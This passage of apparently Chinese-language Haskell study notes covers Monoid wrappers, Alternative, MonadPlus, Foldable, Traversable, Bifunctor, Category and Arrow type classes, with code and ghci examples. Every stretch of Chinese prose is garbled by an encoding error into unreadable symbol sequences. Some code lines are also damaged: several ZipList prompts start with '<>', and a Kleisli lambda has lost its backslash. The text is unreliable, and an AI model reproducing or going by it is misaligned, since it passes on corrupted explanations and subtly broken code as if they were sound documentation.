      ÂÆÉ‰ª¨‰ΩøÁî®SumÊàñProductÊù•ÂåÖË£ÖËµ∑‰∏Ä‰∏™Êï∞Â≠óÔºåÂèØ‰ª•ÈÄöËøágetSumÊàñgetProductÊù•Ëé∑ÂèñÂÖ∂‰∏≠ÁöÑÂÄº

      ÂØπ‰∫éÂä†Ê≥ïÔºå‰∫åÂÖÉÊìç‰Ωú‰∏∫(+)ÔºåÂçï‰ΩçÂÖÉÁ¥†‰∏∫0ÔºõÂØπ‰∫é‰πòÊ≥ïÔºå‰∫åÂÖÉÊìç‰Ωú‰∏∫(\*)ÔºåÂçï‰ΩçÂÖÉÁ¥†‰∏∫1:

      .. container:: float highlight haskell
      ::

         instance Num a => Semigroup (Sum a) where
             (<>) = coerce ((+) :: a -> a -> a)

         instance Num a => Monoid (Sum a) where
             mempty = Sum 0

         instance Num a => Semigroup (Product a) where
             (<>) = coerce ((*) :: a -> a -> a)

         instance Num a => Monoid (Product a) where
             mempty = Product 1

      .. container:: float highlight haskell
      ::

         ghci> Sum 5 <> Sum 6 <> Sum 10
         Sum {getSum = 21}
         ghci> getSum . mconcat . fmap Sum $ [5, 6, 10]
         21
         ghci> Product 5 <> Product 6 <> Product 10
         Product {getProduct = 300}
         ghci> getProduct . mconcat . fmap Product $ [5, 6, 10]
         300

      .. rubric:: ` <#All-amp-Any>`__ All & Any
         :name: All-amp-Any

      ÂíåÊï∞Â≠ó‰∏ÄÊ†∑ÔºåÂ∏ÉÂ∞îÂÄº‰πüÊúâ‰∏§ÁßçÂÆûÁé∞MonoidÁöÑÊñπÂºèÔºåÂõ†Ê≠§ ``Data.Monoid`` Ê®°Âùó‰∏≠‰πüÊèê‰æõ‰∫Ü‰∏§‰∏™ÂåÖË£ÖÂô®ÔºåÂàÜÂà´ÂÆûÁé∞‰∫ÜËøô‰∏§ÁßçMonoidÔºö

      .. container:: float highlight haskell
      ::

         newtype All = All { getAll :: Bool } deriving (...)

         instance Semigroup All where
                 (<>) = coerce (&&)

         instance Monoid All where
                 mempty = All True


         newtype Any = Any { getAny :: Bool } deriving (...)

         instance Semigroup Any where
                 (<>) = coerce (||)

         instance Monoid Any where
                 mempty = Any False

      .. container:: float highlight haskell
      ::

         ghci> getAll (All True <> mempty <> All False)
         False
         ghci> getAll (mconcat (map (\x -> All (even x)) [2,4,6,7,8]))
         False
         ghci> getAny (Any True <> mempty <> Any False)
         True
         ghci> getAny (mconcat (map (\x -> Any (even x)) [2,4,6,7,8]))
         True

      .. rubric:: ` <#Monoid-a-gt-Maybe-a>`__ Monoid a =>
         Maybe a
         :name: Monoid-a-gt-Maybe-a

      Â¶ÇÊûúaÊòØ‰∏Ä‰∏™(Âπ∫)ÂçäÁæ§ÔºåÈÇ£‰πàMaybe
      a‰πüÊòØ‰∏Ä‰∏™Âπ∫ÂçäÁæ§ÔºåÂçï‰ΩçÂÖÉÂ∞±ÊòØNothingÔºö

      .. container:: float highlight haskell
      ::

         instance Semigroup a => Semigroup (Maybe a) where
             Nothing <> b       = b
             a       <> Nothing = a
             Just a  <> Just b  = Just (a <> b)

         instance Semigroup a => Monoid (Maybe a) where
             mempty = Nothing

      .. container:: float highlight haskell
      ::

         ghci> Nothing <> Just "andy"
         Just "andy"
         ghci> Just LT <> Nothing
         Just LT
         ghci> Just (Sum 3) <> Just (Sum 4) 
         Just (Sum {getSum = 7})

      .. rubric:: ` <#First-amp-Last>`__ First & Last
         :name: First-amp-Last

      ÂØπ‰∫éMaybe‰πüÊúâ‰∏§ÁßçÂÆûÁé∞MonoidÁöÑÊñπÊ≥ïÔºåÂç≥<>Êìç‰ΩúÊØèÊ¨°ÊÅíÂèñÂ∑¶ËæπÂíåÊØèÊ¨°ÊÅíÂèñÂè≥ËæπÔºàÂú®Ê≤°ÊúâNothingÁöÑÊÉÖÂÜµ‰∏ãÔºâÔºåÊâÄ‰ª• ``Data.Monoid`` Ê®°Âùó‰∏≠‰πüÊèê‰æõ‰∫Ü‰∏§‰∏™Êñ∞ÁöÑÂåÖË£ÖÂô®ÔºöFirstÂíåLastÔºö

      .. container:: float highlight haskell
      ::

         newtype First a = First { getFirst :: Maybe a } deriving (...)

         instance Semigroup (First a) where
             First Nothing <> b = b
             a             <> _ = a

         instance Monoid (First a) where
             mempty = First Nothing


         newtype Last a = Last { getLast :: Maybe a } deriving (...)

         instance Semigroup (Last a) where
             a <> Last Nothing = a
             _ <> b            = b

         instance Monoid (Last a) where
             mempty = Last Nothing

      .. container:: float highlight haskell
      ::

         ghci> getFirst (First (Just "hello") <> First Nothing <> First (Just "world"))
         Just "hello"
         ghci> getLast (Last (Just "hello") <> Last Nothing <> Last (Just "world"))
         Just "world"
         ghci> getFirst . mconcat . map First $ [Nothing, Just 9, Just 10]  
         Just 9
         ghci> getLast . mconcat . map Last $ [Nothing, Just 9, Just 10]  
         Just 10

      .. rubric:: ` <#Min-amp-Max>`__ Min & Max
         :name: Min-amp-Max

      ÂØπ‰∫éÊúâÁïåÁöÑÁ±ªÂûãÔºå‰πüÊúâ‰∏§ÁßçÂÆûÁé∞MonoidÁöÑÊñπÂºèÔºåÊØèÊ¨°‰∫åÂÖÉÊìç‰ΩúÈÉΩÂèñÊúÄÂ∞èÊàñÊúÄÂ§ß„ÄÇ ``Data.Semigroup`` Ê®°Âùó‰∏≠Êèê‰æõ‰∫Ü‰∏§‰∏™ÂåÖË£ÖÂÖ∂Âô®ÔºöMinÂíåMaxÔºö

      .. container:: float highlight haskell
      ::

         newtype Min a = Min { getMin :: a } deriving (...)

         instance Ord a => Semigroup (Min a) where
             (<>) = coerce (min :: a -> a -> a)

         instance (Ord a, Bounded a) => Monoid (Min a) where
             mempty = maxBound


         newtype Max a = Max { getMax :: a } deriving (...)

         instance Ord a => Semigroup (Max a) where
             (<>) = coerce (max :: a -> a -> a)

         instance (Ord a, Bounded a) => Monoid (Max a) where
             mempty = minBound

      .. container:: float highlight haskell
      ::

         ghci> Min 3 <> Min 5
         Min {getMin = 3}
         ghci> Max 3 <> Max 5
         Max {getMax = 5}
         ghci> getMin . mconcat . map Min $ [1,2,3] :: Int
         1
         ghci> getMax . mconcat . map Max $ [1,2,3] :: Int
         3

      .. rubric:: ` <#ÂÖÉÁªÑ>`__ ÂÖÉÁªÑ
         :name: ÂÖÉÁªÑ

      ÂΩìÂÖÉÁªÑÂÜÖÁöÑÊâÄÊúâÂÖÉÁ¥†ÈÉΩÊòØÂπ∫ÂçäÁæ§Êó∂ÔºåÊï¥‰∏™ÂÖÉÁªÑ‰πüÊòØ‰∏Ä‰∏™Âπ∫ÂçäÁæ§Ôºö

      .. container:: float highlight haskell
      ::

         instance (Semigroup a, Semigroup b) => Semigroup (a, b) where
                 (a,b) <> (a',b') = (a<>a',b<>b')
                 stimes n (a,b) = (stimes n a, stimes n b)

         instance (Monoid a, Monoid b) => Monoid (a,b) where
                 mempty = (mempty, mempty)

      .. container:: float highlight haskell
      ::

         ghci> mconcat $ map (\x -> (Min x, Max x)) [1..10] :: (Min Int, Max Int)
         (Min {getMin = 1},Max {getMax = 10})

      .. rubric:: ` <#Monoid-Laws>`__ Monoid Laws
         :name: Monoid-Laws

      -  mempty <> x ``=`` x
      -  x <> mempty ``=`` x
      -  (x <> y) <> z ``=`` x <> (y <> z)


   .. rubric:: ` <#Monoidal-classes>`__ Monoidal classes
      :name: Monoidal-classes

      Applicative„ÄÅMonad„ÄÅArrowÈÉΩÊúâÊúâÂπ∫ÂçäÁæ§ÊÄßË¥®ÁöÑÂ≠êÁ±ªÂûãÁ±ªÔºåÂàÜÂà´ÊòØAlternative„ÄÅMonadPlus„ÄÅArrowPlus

      .. rubric:: ` <#Alternative>`__ Alternative
         :name: Alternative

      .. container:: float highlight haskell
      ::

         class Applicative f => Alternative f where
             -- | The identity of '<|>'
             empty :: f a
             -- | An associative binary operation
             (<|>) :: f a -> f a -> f a

             some :: f a -> f [a]
             some v = (:) <$> v <*> many v
             many :: f a -> f [a]
             many v = some v <|> pure []

      ÂÖ∂‰∏≠emptyÊòØÂπ∫ÂçäÁæ§‰∏≠ÁöÑÂçï‰ΩçÂÖÉÁ¥†Ôºå<\|>ÊòØÂπ∫ÂçäÁæ§‰∏≠ÁöÑ‰∫åÂÖÉËøêÁÆóÁ¨¶„ÄÇsomeÂíåmanyÊòØ‰∏§‰∏™ÂáΩÊï∞Ôºà [STRIKEOUT:ÊÑè‰πâËøò‰∏çÊáÇ] Ôºâ

      .. rubric:: ` <#AlternativeÂÆû‰æã>`__ AlternativeÂÆû‰æã
         :name: AlternativeÂÆû‰æã

      .. rubric:: ` <#-3>`__ []
         :name: -3

      .. container:: float highlight haskell
      ::

         instance Alternative [] where
             empty = []
             (<|>) = (++)

      ÂíåMonoid‰∏ÄÊ†∑ÔºåÂçï‰ΩçÂÖÉÁ¥†ÊòØÁ©∫ÂàóË°®Ôºå‰∫åÂÖÉËøêÁÆóÊòØÂàóË°®ÂêàÂπ∂

      .. container:: float highlight haskell
      ::

         ghci> [1,2,3] <|> empty <|> [4,5]
         [1,2,3,4,5]
         ghci> some []
         []
         ghci> many []
         [[]]

      .. rubric:: ` <#Maybe-3>`__ Maybe
         :name: Maybe-3

      .. container:: float highlight haskell
      ::

         instance Alternative Maybe where
             empty = Nothing
             Nothing <|> r = r
             l       <|> _ = l

      Maybe‰Ωú‰∏∫AlternativeÁöÑÂçï‰ΩçÂÖÉÁ¥†ÊòØNothingÔºå‰∫åÂÖÉËøêÁÆóÊòØÂßãÁªàÂèñÂ∑¶ËæπÔºàÂΩìÂ∑¶Ëæπ‰∏ç‰∏∫NothingÊó∂Ôºâ

      .. container:: float highlight haskell
      ::

         ghci> Nothing <|> Just 1 <|> Just 2 
         Just 1 
         ghci> some Nothing
         Nothing 
         ghci> many Nothing 
         Just []

      .. rubric:: ` <#ZipList-1>`__ ZipList
         :name: ZipList-1

      .. container:: float highlight haskell
      ::

         instance Alternative ZipList where
            empty = ZipList []
            ZipList xs <|> ZipList ys = ZipList (xs ++ drop (length xs) ys)

      .. container:: float highlight haskell
      ::

         <>getZipList $ ZipList [1,2] <|> ZipList [3,4,5,6]
         [1,2,5,6]
         <>getZipList $ ZipList [1,2,3,4] <|> ZipList [3,4,5,6]
         [1,2,3,4]

      .. rubric:: ` <#Alternative-Laws>`__ Alternative Laws
         :name: Alternative-Laws

      -  ``Monoid laws``:

         .. container:: float highlight haskell
         ::

            empty <|> x = x 
            x <|> empty = x 
            (x <|> y) <|> z = x <|> (y <|> z)

      -  ``Left zero law`` Ôºöempty <\*> f ``=`` empty
         ‰ª•‰∏äÁöÑÂÆöÂæãÊòØÈÉΩÊª°Ë∂≥ÈÉΩÔºå‰∏ãÈù¢ÁöÑÂÆöÂæãÂè™ÊúâÈÉ®ÂàÜÊª°Ë∂≥Ôºö
      -  ``Right zero law`` Ôºöf <\*> empty ``=`` empty
         ÔºàÂ§ßÈÉ®ÂàÜÂåÖÊã¨Maybe„ÄÅ[]Êª°Ë∂≥ÔºåIO‰∏çÊª°Ë∂≥Ôºâ
      -  ``Left distribution`` Ôºö(a <\|> b) <\*> c ``=`` (a
         <\*> c) <\|> (b <\*> c)
         ÔºàMaybe„ÄÅ[]Êª°Ë∂≥ÔºåIOÂèäÂ§ßÈÉ®ÂàÜparsers‰∏çÊª°Ë∂≥Ôºâ
      -  ``Right distribution`` Ôºöa <\*> (b <\|> c) ``=``
         (a <\*> b) <\|> (a <\*> c)
         ÔºàÂ§ßÈÉ®ÂàÜ‰∏çÊª°Ë∂≥Ôºå‰ΩÜMaybeÊª°Ë∂≥Ôºâ
      -  ``Left catch`` Ôºö(pure a) <\|> x = pure a
         ÔºàMaybe„ÄÅIO„ÄÅparsersÊª°Ë∂≥Ôºå‰ΩÜ[]‰∏çÊª°Ë∂≥Ôºâ

      .. rubric:: ` <#Â∏∏Áî®ÂáΩÊï∞-3>`__ Â∏∏Áî®ÂáΩÊï∞
         :name: Â∏∏Áî®ÂáΩÊï∞-3

      -  ``asum`` :: (Foldable t, Alternative f) => t (f a)
         -> f aÔºåÁõ∏ÂΩì‰∫éfoldr (<\|>) emptyÔºö

         .. container:: float highlight haskell
         ::

            ghci> asum [Nothing, Just 5, Just 3]
            Just 5
            ghci> asum [[2],[3],[4,5]]
            [2,3,4,5]

      -  ``guard`` :: (Alternative f) => Bool -> f ()Ôºö

         .. container:: float highlight haskell
         ::

            guard True  = pure ()
            guard False = empty 

      .. rubric:: ` <#MonadPlus>`__ MonadPlus
         :name: MonadPlus

      .. container:: float highlight haskell
      ::

         class (Alternative m, Monad m) => MonadPlus m where
            mzero :: m a
            mzero = empty

            mplus :: m a -> m a -> m a
            mplus = (<|>)

      .. rubric:: ` <#MonadPlusÂÆû‰æã>`__ MonadPlusÂÆû‰æã
         :name: MonadPlusÂÆû‰æã

      []„ÄÅMaybeÈÉΩÊòØMonadPlusÁöÑÂÆû‰æãÔºåmzeroÂíåmplusÈÉΩÁî±AlternativeÂÆûÁé∞

      .. rubric:: ` <#MonadPlus-Laws>`__ MonadPlus Laws
         :name: MonadPlus-Laws

      -  ``Monoid laws``
      -  ``Left zero`` Ôºömzero >>= f ``=`` mzero
      -  ``Right zero`` Ôºöm >> mzero ``=`` mzero

      .. rubric:: ` <#Â∏∏Áî®ÂáΩÊï∞-4>`__ Â∏∏Áî®ÂáΩÊï∞
         :name: Â∏∏Áî®ÂáΩÊï∞-4

      -  ``msum`` = asum
      -  ``mfilter`` Ôºö

         .. container:: float highlight haskell
         ::

            mfilter p ma = do
                a <- ma
                if p a then return a else mzero

      .. rubric:: ` <#ArrowPlus>`__ ArrowPlus
         :name: ArrowPlus

      ArrowZeroÂíåArrowPlusÂàÜÂà´‰∏∫ArrowËÆæÁΩÆ‰∫ÜMonoid‰∏≠ÁöÑÂçï‰ΩçÂÖÉÁ¥†Âíå‰∫åÂÖÉËøêÁÆóÁ¨¶Ôºå‰Ωø‰πãÊàê‰∏∫‰∫Ü‰∏Ä‰∏™Âπ∫ÂçäÁæ§Ôºö

      .. container:: float highlight haskell
      ::

         class Arrow arr => ArrowZero arr where
             zeroArrow :: b `arr` c

         class ArrowZero arr => ArrowPlus arr where
             (<+>) :: (b `arr` c) -> (b `arr` c) -> (b `arr` c)


   .. rubric:: ` <#‰∏Ä‰∫õÂÖ∂ÂÆÉtypeclasses>`__ ‰∏Ä‰∫õÂÖ∂ÂÆÉtypeclasses
      :name: ‰∏Ä‰∫õÂÖ∂ÂÆÉtypeclasses

      .. rubric:: ` <#Foldable>`__ Foldable
         :name: Foldable

      FoldableÊòØË°®Á§∫ÂèØ‰ª•ÊäòÂè†ÔºàfoldÔºâÁöÑÁ±ªÂûãÁ±ªÔºåÂú® ``Data.Foldable`` ‰∏≠ÂÆö‰πâÔºåËøô‰ΩøÂæóÂíåfoldÁõ∏ÂÖ≥ÁöÑÂáΩÊï∞ÂèØ‰ª•Áî®Âú®‰ªªÊÑèFoldableÁöÑÂÆû‰æãÁ±ªÂûã‰∏ä„ÄÇÂÆÉÁöÑÂÆö‰πâÊòØÔºö

      .. container:: float highlight haskell
      ::

         class Foldable t where
             fold     :: Monoid m => t m -> m
             foldMap  :: Monoid m => (a -> m) -> t a -> m
             foldMap' :: Monoid m => (a -> m) -> t a -> m
             foldr    :: (a -> b -> b) -> b -> t a -> b
             foldr'   :: (a -> b -> b) -> b -> t a -> b
             foldl    :: (b -> a -> b) -> b -> t a -> b
             foldl'   :: (b -> a -> b) -> b -> t a -> b
             foldr1   :: (a -> a -> a) -> t a -> a
             foldl1   :: (a -> a -> a) -> t a -> a
             toList   :: t a -> [a]
             null     :: t a -> Bool
             length   :: t a -> Int
             elem     :: Eq a => a -> t a -> Bool
             maximum  :: Ord a => t a -> a
             minimum  :: Ord a => t a -> a
             sum      :: Num a => t a -> a
             product  :: Num a => t a -> a
             {-# MINIMAL foldMap | foldr #-}

      ÊúÄÂ∞ëÂè™Ë¶ÅÂÆûÁé∞ ``foldr`` Âíå ``foldMap`` ÂÖ∂‰∏≠‰πã‰∏ÄÂ∞±ÂèØ‰ª•‰Ωø‰∏Ä‰∏™Á±ªÂûãÊàê‰∏∫FoldableÁöÑÂÆû‰æãÔºåÂÖ∂ÂÆÉÁöÑÂáΩÊï∞ÈÉΩÊúâÁî±Ëøô‰∏§‰∏™ÂáΩÊï∞Êèê‰æõÁöÑÈªòËÆ§ÂÆûÁé∞ÔºåËÄå‰∏îËøô‰∏§‰∏™ÂáΩÊï∞‰πãÈó¥‰πüÊúâÁõ∏‰∫íÂÆûÁé∞„ÄÇÂõ†Ê≠§Âè™Ë¶ÅÂÆûÁé∞foldrÊàñfoldMap‰∏Ä‰∏™ÂáΩÊï∞Â∞±ÂèØ‰ª•‰ΩøÁî®ÊâÄÊúâÂÖ∂ÂÆÉFoldable‰∏≠ÁöÑÂáΩÊï∞„ÄÇfoldrÂáΩÊï∞Âú®ÂâçÈù¢Â∑≤ÁªèÊúâÂ≠¶ËøáÔºåfoldMapÁöÑ‰æãÂ≠êÊòØÔºö

      .. container:: float highlight haskell
      ::

         ghci> foldMap Sum [1, 3, 5]
         Sum {getSum = 9}
         ghci> foldMap Product [1, 3, 5]
         Product {getProduct = 15}
         ghci> foldMap (replicate 3) [1, 2, 3]
         [1,1,1,2,2,2,3,3,3]

      .. rubric:: ` <#FoldableÂÆû‰æã>`__ FoldableÂÆû‰æã
         :name: FoldableÂÆû‰æã

      []„ÄÅMaybe„ÄÅEither a„ÄÅ(,)
      aÈÉΩÊòØFoldableÁöÑÂÆû‰æãÔºåÊ†áÂáÜÂÆπÂô®Â∫ì‰∏≠ÁöÑMap„ÄÅSetÁ≠â‰πüÈÉΩÊòØFoldableÁöÑÂÆû‰æã„ÄÇ‰πüÂèØ‰ª•Ëá™ÂÆö‰πâ‰∫åÂèâÊ†ëÁ±ªÂûãÔºåÂπ∂‰ΩøÂÖ∂Êàê‰∏∫FoldableÁöÑÂÆû‰æãÔºö

      .. container:: float highlight haskell
      ::

         data Tree a = Empty | Leaf a | Node (Tree a) a (Tree a)

         instance Foldable Tree where 
             foldMap :: Monoid m => (a -> m) -> Tree a -> m
             foldMap f Empty        = mempty
             foldMap f (Leaf x)     = f x
             foldMap f (Node l k r) = foldMap f l `mappend` f k `mappend` foldMap f r

      .. rubric:: ` <#Â∏∏Áî®ÂáΩÊï∞-5>`__ Â∏∏Áî®ÂáΩÊï∞
         :name: Â∏∏Áî®ÂáΩÊï∞-5

      -  ``asum`` :: (Alternative f, Foldable t) => t (f a)
         -> f aÔºåÁî®<\|>ÈÄê‰∏™ËøûÊé•ÊâÄÊúâÂÖÉÁ¥†
      -  ``sequenceA_`` :: (Applicative f, Foldable t) => t
         (f a) -> f ()ÔºåÁî±‰∫é‰∏¢ÂºÉÁªìÊûúÔºåÊâÄ‰ª•Foldable
         tÂ∞±ÂèØ‰ª•Êª°Ë∂≥ÔºõÂõ†Ê≠§‰∏çÂêå‰∫ésequenceAÈúÄË¶ÅTraversable
      -  ``traverse_`` :: (Applicative f, Foldable t) => (a
         -> f b) -> t a -> f ()
      -  ``for_`` :: (Applicative f, Foldable t) => t a ->
         (a -> f b) -> f ()

      .. rubric:: ` <#Traversable>`__ Traversable
         :name: Traversable

      TraversableÊòØË°®Á§∫ÂèØÈÅçÂéÜÁöÑÁ±ªÂûãÁ±ªÔºåÂú® ``Data.Traversable`` Ê®°Âùó‰∏≠ÂÆö‰πâÔºåÂÆÉÊòØFoldableÁöÑÂçáÁ∫ßÁâàÔºåÂêåÊó∂‰πüÊòØ‰∏Ä‰∏™FunctorÔºåÂÆÉÁöÑÂÆö‰πâÊòØÔºö

      .. container:: float highlight haskell
      ::

         class (Functor t, Foldable t) => Traversable t where 
             traverse  :: Applicative f => (a -> f b) -> t a -> f (t b)
             sequenceA :: Applicative f => t (f a) -> f (t a)
             mapM      ::       Monad m => (a -> m b) -> t a -> m (t b)
             sequence  ::       Monad m => t (m a) -> m (t a)
             {-# MINIMAL traverse | sequenceA #-}

      ÊúÄÂ∞ëÂè™ÈúÄË¶ÅÂÆûÁé∞traverseÂáΩÊï∞ÊàñËÄÖsequenceAÂáΩÊï∞„ÄÇÂÖ∂‰∏≠ÂêÑ‰∏™ÂáΩÊï∞ÁöÑÂäüËÉΩÈÄöËøáÁ±ªÂûãÁ≠æÂêç‰πüÈÉΩËÉΩÊé®ÊµãÂá∫Êù•„ÄÇ‰ΩÜÊòØÂÖ∂‰∏≠mapMÂ∞±ÊòØtraverseÔºåsequenceÂ∞±ÊòØsequenceAÔºåÂÆÉ‰ª¨Â≠òÂú®Âè™ÊòØÂéÜÂè≤ÈÅóÁïôÔºà

      .. rubric:: ` <#TraversableÂÆû‰æã>`__ TraversableÂÆû‰æã
         :name: TraversableÂÆû‰æã

      .. container:: float highlight haskell
      ::

         instance Traversable Maybe where
             traverse _ Nothing = pure Nothing
             traverse f (Just x) = Just <$> f x

         instance Traversable [] where
             {-# INLINE traverse #-}
             traverse f = foldr cons_f (pure [])
               where cons_f x ys = liftA2 (:) (f x) ys

         instance Traversable (Either a) where
             traverse _ (Left x) = pure (Left x)
             traverse f (Right y) = Right <$> f y

         instance Traversable ((,) a) where
             traverse f (x, y) = (,) x <$> f y

         ...

      ‰∏äÈù¢ÁöÑTree‰πüÂèØ‰ª•Êàê‰∏∫TraversableÁöÑÂÆû‰æãÔºö

      .. container:: float highlight haskell
      ::

         instance Functor Tree where
             fmap :: (a -> b) -> Tree a -> Tree b
             fmap     g Empty        = Empty
             fmap     g (Leaf x)     = Leaf $ g x
             fmap     g (Node l x r) = Node (fmap g l)
                                            (g x)
                                            (fmap g r)

         instance Traversable Tree where
             traverse :: Applicative f => (a -> f b) -> Tree a -> f (Tree b) 
             traverse g Empty        = pure Empty
             traverse g (Leaf x)     = Leaf <$> g x
             traverse g (Node l x r) = Node <$> traverse g l
                                            <*> g x
                                            <*> traverse g r

      .. rubric:: ` <#Traversable-Laws>`__ Traversable Laws
         :name: Traversable-Laws

      Traversable‰πüÊúâ‰∏§Êù°ÂÆöÂæãÔºö

      #. traverse Identity ``=`` Identity
      #. traverse (Compose . fmap g . f) ``=`` Compose .
         fmap (traverse g) . traverse f

      ÂÖ∂‰∏≠IdentityÂíåComposeÂàÜÂà´ÂÆö‰πâÂú® ``Data.Functor.Identity`` Âíå ``Data.Functor.Compose`` ‰∏§‰∏™Ê®°Âùó‰∏≠Ôºö

      .. container:: float highlight haskell
      ::

         newtype Identity a = Identity { runIdentity :: a } deriving (...)
         newtype Compose f g a = Compose { getCompose :: f (g a) } deriving (...)

      .. rubric:: ` <#Bifunctor>`__ Bifunctor
         :name: Bifunctor

      FunctorÁöÑÂÆû‰æãÁöÑkindÈÉΩÊòØ\* ->
      \*ÔºåÂõ†Ê≠§fmapÂè™ËÉΩÂ∞Ü‰∏Ä‰∏™ÂáΩÊï∞Êò†Â∞ÑÂà∞‰∏Ä‰∏™ÂÄº‰∏ä„ÄÇËÄåBifunctorÔºàÂú® ``Data.Bifunctor`` Ê®°Âùó‰∏≠ÂÆö‰πâÔºâÁöÑÂÆû‰æãÁöÑkindÊòØ\*
      -> \* ->
      \*ÔºåËÄå‰∏îÂÆÉÁöÑbimapÂèØ‰ª•ÂêåÊó∂Â∞Ü‰∏§‰∏™ÂáΩÊï∞Êò†Â∞ÑÂà∞‰∏§‰∏™ÂÄº‰∏äÔºö

      .. container:: float highlight haskell
      ::

         class Bifunctor p where 
             bimap  :: (a -> b) -> (c -> d) -> p a c -> p b d 
             first  :: (a -> b) -> p a c -> p b c 
             second :: (b -> c) -> p a b -> p a c 
             {-# MINIMAL bimap | first, second #-}

      ÂêåÊó∂bimapÂíåfirst,second‰πãÈó¥‰πüÂèØ‰ª•Áõ∏‰∫íËΩ¨Êç¢Ôºö

      .. container:: float highlight haskell
      ::

         bimap f g = first f . second g

         first  f = bimap f id
         second g = bimap id g

      ÂØπ‰∫éFunctorÔºå((,) e)ÂíåEither
      eÊâçÊòØFunctorÁöÑÂÆû‰æãÔºåÂõ†‰∏∫‰ªñ‰ª¨ÊòØ\* ->
      \*„ÄÇ‰ΩÜÊòØÂØπ‰∫éBifunctorÔºå(,)ÂíåEitherÂ∞±ÊòØBifunctorÁöÑÂÆû‰æãÔºö

      .. container:: float highlight haskell
      ::

         ghci> bimap (+1) length (4, [1,2,3])
         (5,3)

      .. rubric:: ` <#Bifunctor-Laws>`__ Bifunctor Laws
         :name: Bifunctor-Laws

      #. bimap id id ``=`` id
         first id ``=`` id
         second id ``=`` id
      #. bimap (f . g) (h . i) ``=`` bimap f h . bimap g i
         first (f . g) ``=`` first f . first g
         second (f . g) ``=`` second f . second g

      .. rubric:: ` <#Category>`__ Category
         :name: Category

      Haskell ‰∏≠ÁöÑ Category Â∞Ü‰∏ÄËà¨ÁöÑÂáΩÊï∞Êé®ÂπøÂà∞‰∫ÜÊôÆÈÅçÁöÑÊÄÅÂ∞Ñ‰∏äÔºåÂÆÉÂú® ``Control.Category`` Ê®°Âùó‰∏≠ÔºåÂÆö‰πâÊòØÔºö

      .. container:: float highlight haskell
      ::

         class Category cat where 
             id  :: cat a a 
             (.) :: cat b c -> cat a b -> cat a c

      ÂÆÉÁöÑÂÆû‰æãÊúâ ``(->)`` Âíå ``Kleisli m`` Ôºö

      .. container:: float highlight haskell
      ::

         instance Category (->) where
             id = GHC.Base.id
             (.) = (GHC.Base..)

      KleisliÊòØ‰∏Ä‰∏™ËåÉÁï¥ÔºåÁî®Êù•Ë°®Á§∫ÂáΩÊï∞a -> m
      bÔºåHaskell‰∏≠ÔºåÂÆÉÂú® ``Control.Arrow`` Ê®°Âùó‰∏≠ÂÆö‰πâÔºö

      .. container:: float highlight haskell
      ::

         newtype Kleisli m a b = Kleisli { runKleisli :: a -> m b }

         instance Monad m => Category (Kleisli m) where
             id :: Kleisli m a a
             id = Kleisli return

             (.) :: Kleisli m b c -> Kleisli m a b -> Kleisli m a c
             Kleisli g . Kleisli h = Kleisli (h >=> g)

      CategoryË¶ÅÊª°Ë∂≥ÁöÑÂÆöÂæãÂè™ÊúâidÊòØ(.)Êìç‰ΩúÁöÑÂçï‰ΩçÂÖÉÔºå‰ª•Âèä(.)Êìç‰ΩúÊòØÂèØÁªìÂêàÁöÑ

      ÂêåÊó∂CategoryËøòÊèê‰æõ‰∫Ü‰∏§‰∏™ÂáΩÊï∞ ``<<<`` Âíå ``>>>`` Ôºö

      .. container:: float highlight haskell
      ::

         (<<<) :: Category cat => cat b c -> cat a b -> cat a c
         (<<<) = (.)

         (>>>) :: Category cat => cat a b -> cat b c -> cat a c 
         f >>> g = g . f 

      .. rubric:: ` <#Arrow>`__ Arrow
         :name: Arrow

      ArrowÂ∞ÜÂáΩÊï∞Ëøõ‰∏ÄÊ≠•ÊäΩË±°ÂåñÔºåÂÆÉÂÆö‰πâÂú® ``Control.Arrow`` Ê®°Âùó‰∏≠Ôºö

      .. container:: float highlight haskell
      ::

         class Category a => Arrow a where 
             arr    :: (b -> c) -> a b c 
             first  :: a b c -> a (b, d) (c, d)
             second :: a b c -> a (d, b) (d, c)
             (***)  :: a b c -> a b' c' -> a (b, b') (c, c')
             (&&&)  :: a b c -> a b c' -> a b (c, c')
             {-# MINIMAL arr, (first | (***)) #-}

      ÂÖ∂‰∏≠Ôºö

      -  ``arr`` ÂáΩÊï∞Â∞Ü‰∏Ä‰∏™ÂáΩÊï∞ÂèòÊàê‰∏Ä‰∏™Arrow
      -  ``first`` ÂáΩÊï∞Â∞Ü‰∏Ä‰∏™ArrowÂèòÊàê‰∏Ä‰∏™‰∫åÂÖÉÁªÑÈó¥ÁöÑArrowÔºå‰∏îÂè™‰ºöÂØπ‰∏Ä‰∏™ÂÖÉÁ¥†ËøõË°åÊìç‰ΩúÔºåÁ¨¨‰∫å‰∏™ÂÖÉÁ¥†‰øùÊåÅ‰∏çÂèò
      -  ``second`` ÂáΩÊï∞‰∏éfirstÁõ∏ÂèçÔºåÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†‰øùÊåÅ‰∏çÂèò
      -  ``***`` ÂáΩÊï∞ÊòØArrow‰πãÈó¥ÁöÑparallel
         compositionÔºåÂØπ‰∫éÂáΩÊï∞: (g \**\* h) (x, y) = (g x, h
         y)
      -  ``&&&`` ÂáΩÊï∞ÊòØArrow‰πãÈó¥ÁöÑfanout
         compositionÔºåÂØπ‰∫éÂáΩÊï∞: (g &&& h) x = (g x, h x)

      ÂÆÉÁöÑÂÆû‰æã‰πüÊúâ(->)ÂíåKleisliÔºö

      .. container:: float highlight haskell
      ::

         instance Arrow (->) where
           arr :: (b -> c) -> (b -> c)
           arr g = g

           first :: (b -> c) -> ((b,d) -> (c,d))
           first g (x,y) = (g x, y)

         instance Monad m => Arrow (Kleisli m) where
           arr :: (b -> c) -> Kleisli m b c
           arr f = Kleisli (return . f)

           first :: Kleisli m b c -> Kleisli m (b,d) (c,d)
           first (Kleisli f) = Kleisli ( ~(b,d) -> do c <- f b
                                                       return (c,d) )

      Â∏∏Áî®ÂáΩÊï∞Ôºö

      .. container:: float highlight haskell
      ::

         returnA :: Arrow a => a b b
         returnA = arr id

         (^>>) :: Arrow a => (b -> c) -> a c d -> a b d
         f ^>> a = arr f >>> a

         (>>^) :: Arrow a => a b c -> (c -> d) -> a b d
         a >>^ f = a >>> arr f

         (<<^) :: Arrow a => a c d -> (b -> c) -> a b d
         a <<^ f = a <<< arr f

         (^<<) :: Arrow a => (c -> d) -> a b c -> a b d
         f ^<< a = arr f <<< a

      .. rubric:: ` <#Arrow-notation>`__ Arrow notation
         :name: Arrow-notation

      Á±ª‰ººdo-notationÔºåArrow‰πüÊèê‰æõ‰∫Ü‰∏ÄÂ•óÊñπ‰æøÁöÑËØ≠Âè•Ôºö

